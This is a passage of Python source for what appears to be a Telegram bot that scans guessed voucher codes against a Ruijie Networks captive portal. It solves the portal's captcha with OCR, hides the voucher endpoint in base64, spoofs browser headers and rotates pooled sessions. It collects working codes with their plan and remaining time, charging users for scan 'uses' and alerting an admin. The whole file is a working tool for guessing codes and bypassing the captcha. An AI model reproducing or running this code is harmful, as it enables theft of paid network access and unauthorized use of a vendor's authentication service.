    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

async def get_pooled_session_id(chat_id, task_session, session_url):
    if chat_id not in _session_pool:
        _session_pool[chat_id] = {
            "slots": [{"session_id": None, "uses": 0, "lock": asyncio.Lock()} for _ in range(SESSION_POOL_SLOTS)],
            "rr": 0
        }
    pool = _session_pool[chat_id]

    for i in range(SESSION_POOL_SLOTS):
        idx = (pool["rr"] + i) % SESSION_POOL_SLOTS
        entry = pool["slots"][idx]
        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
            pool["rr"] = (idx + 1) % SESSION_POOL_SLOTS
            entry["uses"] += 1
            return entry["session_id"]

    idx = pool["rr"] % SESSION_POOL_SLOTS
    pool["rr"] = (pool["rr"] + 1) % SESSION_POOL_SLOTS
    entry = pool["slots"][idx]
    async with entry["lock"]:
        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
            entry["uses"] += 1
            return entry["session_id"]
        new_sid = await get_session_id(task_session, session_url, entry["session_id"])
        if new_sid:
            entry["session_id"] = new_sid
            entry["uses"] = 1
            print(f"[session-pool] chat={chat_id} slot={idx} new sessionId={new_sid}")
        return entry["session_id"]

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
            return

    access = redeem_access.get(chat_id)
    if not access or access.get("uses_remaining", 0) <= 0 or is_weak_or_blocked_key(access.get("code", "")):
        current_task = scan_tasks.get(chat_id)
        if current_task and not current_task["task"].done():
            current_task["stop"] = True
            current_task["scan_id"] = None
            print(f"[perform_check] no uses left or blocked key, stopping scan for chat={chat_id}")
        return

    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()

    response = None
    session_id = None

    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        conn = _connector

        async with aiohttp.ClientSession(connector=conn, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as task_session:
            session_id = await get_pooled_session_id(chat_id, task_session, session_url)
            if not session_id:
                return

            auth_code = None
            for _ in range(3):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    content_type = req.headers.get("Content-Type", "")
                    if req.status in (401, 403):
                        print(f"[voucher] status={req.status}: authentication rejected; stopping this check")
                        return
                    if req.status == 429:
                        print(f"[voucher] status=429: rate limited")
                        response = "request limited"
                    elif req.status >= 500:
                        print(f"[voucher] status={req.status}: upstream service error")
                        response = "upstream service error"
                    elif "json" not in content_type.lower():
                        print(f"[voucher] status={req.status}: unexpected content type {content_type!r}")
                    else:
                        try:
                            resp_json = json.loads(response)
                            print(f"[voucher] code=[redacted] attempt={_attempt+1} status={req.status} resp={resp_json}")
                        except json.JSONDecodeError:
                            print(f"[voucher] status={req.status}: invalid JSON response")
            except Exception as e:
                print(f"[perform_check] request error: {type(e).__name__}: {e}")
                return

        if response and 'captcha' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue
        break

    if not response:
        return

    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
            return

    if 'logonUrl' in response:
        if recheck:
            return code

        used_code_name = None
        used_total = 0
        async with redeem_lock:
            access = redeem_access.get(chat_id)
            if not access or access.get("uses_remaining", 0) <= 0:
                print(f"[perform_check] success found but no uses left")
                current_task = scan_tasks.get(chat_id)
                if current_task and not current_task["task"].done():
                    current_task["stop"] = True
                    current_task["scan_id"] = None
                return

            used_code_name = access.get("code", "-")
            used_total = int(access.get("uses_total", RANDOM_CODE_DEFAULT_USES))
            access["uses_remaining"] = max(0, access.get("uses_remaining", 0) - 1)
            no_more_uses = access["uses_remaining"] <= 0
            if no_more_uses:
                redeem_access.pop(chat_id, None)

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        found_now = len(success_texts[chat_id])
        checked_now = scan_tasks.get(chat_id, {}).get("checked", 0)
        scan_mode_now = scan_tasks.get(chat_id, {}).get("mode", "?")

        asyncio.create_task(notify_admin_found(chat_id, used_code_name, scan_mode_now, code, expire_date))

        if no_more_uses:
            current_task = scan_tasks.get(chat_id)
            if current_task and not current_task["task"].done():
                current_task["stop"] = True
                current_task["scan_id"] = None
                print(f"[scan] auto-stopped for chat={chat_id} (uses exhausted)")
            asyncio.create_task(notify_admin_exhausted(chat_id, used_code_name, used_total, found_now, checked_now))

        asyncio.create_task(_sync_redeem_to_github(chat_id))

        if message:
            try:
                success_messages[chat_id] = await update_chunked_messages(message.chat.id, "Success Codes:", success_texts[chat_id], success_messages.get(chat_id))
            except Exception as e:
                print(f"Success Message Error: {e}")

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        if message:
            try:
                limited_messages[chat_id] = await update_chunked_messages(message.chat.id, "Limited Codes:", limited_texts[chat_id], limited_messages.get(chat_id))
            except Exception as e:
                print(f"Limited Message Error: {e}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    hours = int(total_minutes) // 60
    minutes = int(total_minutes) % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    else:
        return f"{minutes}m"

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), connector_owner=True, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as fresh_session:
            async with fresh_session.get(f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}", headers=headers) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"

_ocr = ddddocr.DdddOcr(show_ad=False)
_ocr_executor = concurrent.futures.ThreadPoolExecutor(max_workers=100)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_ocr_executor, _ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        if req.status != 200:
            raise RuntimeError(f"captcha image request failed with HTTP {req.status}")
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        body = await req.text()
        content_type = req.headers.get("Content-Type", "")
        if req.status != 200:
            print(f"[Varify_Captcha] HTTP {req.status}; content_type={content_type}")
            return None
        if "json" not in content_type.lower():
            print(f"[Varify_Captcha] unexpected content type: {content_type}")
            return None
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            print("[Varify_Captcha] invalid JSON response")
            return None
        print(f"[Varify_Captcha] status={req.status} response={data}")
        return session_id if data.get("success") is True else None

async def start_polling():
    backoff = 5
    while True:
        try:
            print("[polling] Starting infinity_polling...")
            await bot.infinity_polling(timeout=20, request_timeout=35)
            print("[polling] infinity_polling exited cleanly, restarting...")
            await asyncio.sleep(2)
            backoff = 5
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"[polling] Connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"[polling] Unexpected error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    await rebuild_session()
    await purge_unauthorized_access()
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        if session and not session.closed:
            await session.close()
        if _connector and not _connector.closed:
            await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
